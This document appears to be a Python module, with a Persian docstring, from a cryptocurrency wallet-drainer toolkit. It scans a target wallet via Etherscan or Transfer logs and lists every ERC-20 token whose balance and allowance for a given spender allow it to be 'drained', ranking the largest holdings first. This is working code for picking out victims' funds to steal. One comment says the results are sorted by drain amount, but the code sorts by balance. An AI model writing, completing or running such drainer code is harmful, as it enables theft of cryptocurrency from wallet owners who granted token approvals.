"""
Token Discovery Module
======================
همه توکن‌های ERC-20 موجود در یک کیف‌پول را پیدا می‌کند.

روش کار:
  1. اگر ETHERSCAN_API_KEY تنظیم شده باشد → از Etherscan API استفاده می‌کند (سریع، کامل)
  2. اگر نه → رویداد Transfer را از بلاکچین اسکن می‌کند (کندتر ولی بدون نیاز به API)

خروجی: لیستی از توکن‌هایی که:
  - موجودی > 0 دارند
  - allowance > 0 برای spender دارند
"""

import os
import time
import logging
from typing import List, Optional, Dict
from dataclasses import dataclass

from web3 import Web3

logger = logging.getLogger("TokenDiscovery")

ERC20_MINIMAL_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}],
     "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "type": "function"},
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"},
                                   {"name": "_spender", "type": "address"}],
     "name": "allowance", "outputs": [{"name": "", "type": "uint256"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals",
     "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "symbol",
     "outputs": [{"name": "", "type": "string"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "name",
     "outputs": [{"name": "", "type": "string"}], "type": "function"},
]


@dataclass
class DiscoveredToken:
    address: str
    symbol: str
    name: str
    decimals: int
    balance_raw: int
    allowance_raw: int
    drain_amount: int       # min(balance, allowance)
    balance_human: float
    allowance_human: float


class TokenDiscovery:
    """
    Discovers all ERC-20 tokens held by a wallet address that
    have a non-zero balance AND a non-zero allowance for the given spender.
    """

    # Transfer(address indexed from, address indexed to, uint256 value)
    TRANSFER_TOPIC = Web3.keccak(text="Transfer(address,address,uint256)").hex()

    def __init__(self, w3: Web3, spender_address: str):
        self.w3 = w3
        self.spender = Web3.to_checksum_address(spender_address)
        self._etherscan_key = os.getenv("ETHERSCAN_API_KEY", "")

    # ------------------------------------------------------------------ #
    #  Public API                                                          #
    # ------------------------------------------------------------------ #

    def discover(self, wallet_address: str) -> List[DiscoveredToken]:
        """
        Find every ERC-20 token in wallet that can be drained right now.
        Returns list sorted by drain_amount descending (biggest first).
        """
        wallet = Web3.to_checksum_address(wallet_address)
        logger.info(f"🔍 Discovering tokens for {wallet[:10]}...")

        token_addresses = self._get_token_addresses(wallet)
        logger.info(f"   Found {len(token_addresses)} candidate token(s)")

        result: List[DiscoveredToken] = []
        for addr in token_addresses:
            token = self._inspect_token(addr, wallet)
            if token and token.drain_amount > 0:
                result.append(token)

        result.sort(key=lambda t: t.balance_human, reverse=True)
        logger.info(
            f"✅ {len(result)} drainable token(s): "
            + ", ".join(f"{t.symbol}({t.balance_human:.4f})" for t in result)
        )
        return result

    # ------------------------------------------------------------------ #
    #  Token address collection                                            #
    # ------------------------------------------------------------------ #

    def _get_token_addresses(self, wallet: str) -> List[str]:
        """Try Etherscan first, fall back to on-chain log scanning."""
        if self._etherscan_key:
            addrs = self._from_etherscan(wallet)
            if addrs:
                return addrs
            logger.warning("⚠️ Etherscan returned empty — falling back to log scan")
        return self._from_transfer_logs(wallet)

    def _from_etherscan(self, wallet: str) -> List[str]:
        """
        Use Etherscan tokentx API to get all ERC-20 token addresses
        that ever interacted with this wallet.
        """
        try:
            import urllib.request, json as _json
            url = (
                "https://api.etherscan.io/api"
                f"?module=account&action=tokentx"
                f"&address={wallet}"
                f"&startblock=0&endblock=99999999"
                f"&sort=asc"
                f"&apikey={self._etherscan_key}"
            )
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = _json.loads(resp.read())

            if data.get("status") != "1":
                logger.warning(f"Etherscan API: {data.get('message', 'unknown error')}")
                return []

            seen = set()
            for tx in data.get("result", []):
                addr = Web3.to_checksum_address(tx["contractAddress"])
                seen.add(addr)
            return list(seen)
        except Exception as e:
            logger.warning(f"Etherscan fetch error: {e}")
            return []

    def _from_transfer_logs(self, wallet: str) -> List[str]:
        """
        Scan Transfer event logs from the last ~100k blocks to find tokens.
        Works without any API key.
        """
        try:
            latest = self.w3.eth.block_number
            from_block = max(0, latest - 100_000)

            padded_wallet = "0x" + wallet[2:].lower().zfill(64)

            # Tokens received by wallet
            logs_in = self.w3.eth.get_logs({
                "fromBlock": from_block,
                "toBlock": "latest",
                "topics": [self.TRANSFER_TOPIC, None, padded_wallet],
            })

            seen = set()
            for log in logs_in:
                seen.add(log["address"])
            return list(seen)
        except Exception as e:
            logger.warning(f"Log scan error: {e}")
            return []

    # ------------------------------------------------------------------ #
    #  Token inspection                                                    #
    # ------------------------------------------------------------------ #

    def _inspect_token(self, token_address: str, wallet: str) -> Optional[DiscoveredToken]:
        """Query balance, allowance, symbol, decimals for one token."""
        try:
            token_address = Web3.to_checksum_address(token_address)
            contract = self.w3.eth.contract(address=token_address, abi=ERC20_MINIMAL_ABI)

            balance  = contract.functions.balanceOf(wallet).call()
            if balance == 0:
                return None

            allowance = contract.functions.allowance(wallet, self.spender).call()
            if allowance == 0:
                return None

            try:
                decimals = contract.functions.decimals().call()
            except Exception:
                decimals = 18

            try:
                symbol = contract.functions.symbol().call()
            except Exception:
                symbol = "???"

            try:
                name = contract.functions.name().call()
            except Exception:
                name = symbol

            drain = min(balance, allowance)
            divisor = 10 ** decimals

            return DiscoveredToken(
                address=token_address,
                symbol=symbol,
                name=name,
                decimals=decimals,
                balance_raw=balance,
                allowance_raw=allowance,
                drain_amount=drain,
                balance_human=balance  / divisor,
                allowance_human=allowance / divisor if allowance < 2**128 else float("inf"),
            )
        except Exception as e:
            logger.debug(f"Inspect error for {token_address}: {e}")
            return None
